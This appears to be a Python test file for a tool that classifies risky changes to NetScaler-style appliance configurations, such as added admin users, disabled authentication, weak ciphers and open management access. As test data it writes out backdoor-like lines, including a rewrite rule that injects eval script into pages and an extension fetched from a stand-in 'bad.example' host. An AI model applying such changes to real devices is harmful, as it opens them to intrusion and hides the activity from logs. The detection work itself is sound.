from __future__ import annotations

from collections import Counter

import pytest

from netrescale.detect.config_risk import RiskRules, load_risk_rules
from netrescale.detect.severity import Severity
from netrescale.parse.nsconf import parse_command

RULES = load_risk_rules()


def matching_ids(rules: RiskRules, line: str, op: str = "added") -> set[str]:
    command = parse_command(line)
    assert command is not None
    return {rule.id for rule in rules.classify(command, op)}


def test_catalog_has_unique_ids_and_meaningful_vectors() -> None:
    ids = [rule.id for rule in RULES.rules]
    assert [rule_id for rule_id, count in Counter(ids).items() if count > 1] == []
    assert len(ids) >= 40
    assert all(rule.reason.strip() and rule.tests for rule in RULES.rules)

    for rule in RULES.rules:
        for line in rule.tests:
            assert rule.id in matching_ids(RULES, line), (rule.id, line)


@pytest.mark.parametrize(
    ("rule_id", "line"),
    [
        ("mgmt-user", "add system user emergency <redacted:1234abcd> -encrypted"),
        ("unrestricted-cmd-policy", "add system cmdPolicy root_access ALLOW .*"),
        ("saml-oauth-trust", "set authentication samlAction corp -samlIdPCertName new-idp"),
        ("authentication-bypass", "set vpn vserver gateway -authentication OFF"),
        (
            "page-injection",
            'add rewrite action inject replace_all "HTTP.RES.BODY(1000)" '
            'q{"<img src=x onerror=eval(atob(\"YWxlcnQoMSk=\"))>"}',
        ),
        ("logging-disabled", "set audit nslogParams -logLevel NONE"),
        ("unsafe-management-service", "set ns ip 192.0.2.10 -restrictAccess DISABLED"),
        ("any-source-management-acl", "add ns simpleACL open ALLOW -srcIP 0.0.0.0"),
        ("external-certificate-source", "add ssl certKey remote -cert https://bad.example/cert"),
        ("obsolete-tls-enabled", "set ssl profile legacy -tls1 ENABLED"),
        ("weak-cipher-binding", "bind ssl vserver gateway -cipherName EXP-RC4-MD5"),
        ("ntp-auth-disabled", "set ntp param -authentication DISABLED"),
        ("dns-recursion-exposed", "set dns parameter -recursion ENABLED"),
        ("ha-critical-operation", "disable HA node 1"),
        ("default-route-change", "add route6 :: 0 2001:db8::1"),
        ("unsafe-plaintext-protocol", "import ns extension ftp://bad.example/ext.lua ext"),
    ],
)
def test_high_signal_rule_examples(rule_id: str, line: str) -> None:
    assert rule_id in matching_ids(RULES, line)


@pytest.mark.parametrize(
    ("unexpected_rule", "line"),
    [
        ("unrestricted-cmd-policy", "add system cmdPolicy show_only ALLOW (^show\\s+.*)"),
        ("authentication-bypass", "set vpn vserver gateway -authentication ON"),
        ("page-injection", 'add rewrite action header insert_http_header X-Security q{"enabled"}'),
        ("external-redirect", "add responder action local redirect '\"/vpn/index.html\"'"),
        ("logging-disabled", "set audit syslogParams -logLevel ALL"),
        ("unsafe-management-service", "set ns ip 192.0.2.10 -restrictAccess ENABLED"),
        ("any-source-management-acl", "add ns acl admin ALLOW -srcIP 10.20.0.0-10.20.0.255"),
        ("obsolete-tls-enabled", "set ssl profile modern -minProtocolVer TLS1.2"),
        ("weak-cipher-binding", "bind ssl vserver gateway -cipherName TLS1.3-AES256-GCM-SHA384"),
        ("ntp-auth-disabled", "set ntp param -authentication ENABLED"),
        ("dns-recursion-exposed", "set dns parameter -recursion DISABLED"),
        ("ha-critical-operation", "set HA node 1 -haMonitor ENABLED"),
    ],
)
def test_high_signal_rules_avoid_benign_changes(unexpected_rule: str, line: str) -> None:
    assert unexpected_rule not in matching_ids(RULES, line)


def test_sensitive_changes_reach_expected_severity() -> None:
    cases = [
        ("set system parameter -strongpassword disabled", Severity.CRITICAL),
        ("set authentication OAuthAction oidc -tokenEndpoint https://idp.example/token", Severity.CRITICAL),
        ("set audit syslogAction primary -transport UDP", Severity.HIGH),
        ("set ssl profile frontend -tls12 DISABLED", Severity.HIGH),
        ("add ntp server 192.0.2.123", Severity.MEDIUM),
    ]
    for line, expected in cases:
        command = parse_command(line)
        assert command is not None
        severity = max((rule.severity for rule in RULES.classify(command, "added")), default=RULES.default)
        assert severity is expected
